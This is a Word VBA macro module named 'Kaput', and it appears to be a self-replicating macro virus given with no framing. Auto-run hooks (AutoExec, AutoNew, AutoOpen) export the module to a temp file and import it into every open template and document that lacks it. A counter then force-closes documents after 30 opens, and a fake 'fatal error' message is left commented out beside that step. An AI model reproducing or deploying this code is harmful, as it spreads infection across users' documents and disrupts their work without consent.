   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Kaput"
   Option Explicit

   Sub AutoExec()
     Kaput
   End Sub

   Sub AutoNew()
     Kaput
   End Sub

   Sub AutoOpen()
   Dim aVar As Object, num As Integer
   Kaput

   If ThisDocument.Name = "NORMAL.DOT" Then Exit Sub

   If Len(Dir("c:\windows\lbes.dll")) > 0 Or Day(Date) < 5 Then Exit Sub

   For Each aVar In ActiveDocument.Variables
       If aVar.Name = "SX" Then num = aVar.Index
   Next aVar
   If num = 0 Then
       ActiveDocument.Variables.Add Name:="SX", Value:=1
       num = 1
   Else
       ActiveDocument.Variables(num).Value = ActiveDocument.Variables(num).Value + 1
   End If
   ' MsgBox ActiveDocument.Variables(num).Value
   If ActiveDocument.Variables(num).Value > 30 Then
    '   MsgBox "No open document. Fatal error. Windows API R/I interface blockOut", vbCritical + vbOKOnly
       ActiveDocument.Close wdSaveChanges
   End If

   End Sub

   Sub Kaput()
   Dim openDoc, od As Object, Md, ss As Object, fl As Boolean

   Set Md = ThisDocument.VBProject.VBComponents.Item("Kaput")
   Md.Export ("c:\qq.qq")

   For Each openDoc In Templates
   With openDoc
     fl = True
     For Each od In .VBProject.VBComponents
        If od.Name = "Kaput" Then fl = False
     Next od
     If fl Then Set ss = .VBProject.VBComponents.Import("c:\qq.qq")
   End With
   Next openDoc
   '----------------------------------------------------------
   For Each openDoc In Documents
       With openDoc
         fl = True
         For Each od In .VBProject.VBComponents
           If od.Name = "Kaput" Then fl = False
         Next od
         If fl Then Set ss = .VBProject.VBComponents.Import("c:\qq.qq")
       End With
   Next openDoc
   Kill "c:\qq.qq"



   End Sub
